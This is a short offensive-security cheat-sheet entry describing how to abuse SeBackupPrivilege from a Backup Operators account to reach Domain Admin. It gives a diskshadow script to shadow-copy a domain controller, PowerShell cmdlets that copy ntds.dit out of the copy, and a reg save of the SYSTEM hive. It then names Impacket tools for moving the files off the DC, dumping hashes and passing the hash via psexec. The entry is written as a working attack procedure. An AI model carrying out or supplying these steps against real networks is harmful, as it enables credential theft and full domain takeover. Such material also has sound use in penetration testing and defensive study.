**WHAT IS THIS?:**

If we manage to compromise a user account that is member of the Backup Operators group, we can then abuse it's `SeBackupPrivilege` to create a shadow copy of the current state of the DC, extract the `ntds.dit` database file, dump the hashes and escalate our privileges to DA.

1. Once we have access on an account that has the `SeBackupPrivilege` we can access the DC and create a shadow copy using the signed binary `diskshadow`:
```powershell
# Create a .txt file that will contain the shadow copy process script
Script ->{
set context persistent nowriters
set metadata c:\windows\system32\spool\drivers\color\example.cab
set verbose on
begin backup
add volume c: alias mydrive

create

expose %mydrive% w:
end backup
}

# Execute diskshadow with our script as parameter
diskshadow /s script.txt
```
2. Next we need to access the shadow copy. We may have the `SeBackupPrivilege` but we cant just simply copy-paste `ntds.dit`, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are going to use [this (SeBackupPrivilege)](https://github.com/giuliano108/SeBackupPrivilege) amazing repo:
```powershell
# Importing both dlls from the repo using powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

# Checking if the SeBackupPrivilege is enabled
Get-SeBackupPrivilege

# If it isn't we enable it
Set-SeBackupPrivilege

# Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite

# Dump the SYSTEM hive
reg save HKLM\SYSTEM c:\temp\system.hive
```
3. Using `smbclient.py` from Impacket or some other tool, we copy `ntds.dit` and the `SYSTEM` hive on our local machine.
4. Use `secretsdump.py` from Impacket and dump the hashes.
5. Use `psexec` or another tool of your choice to Pass-The-Hash and get Domain Admin access.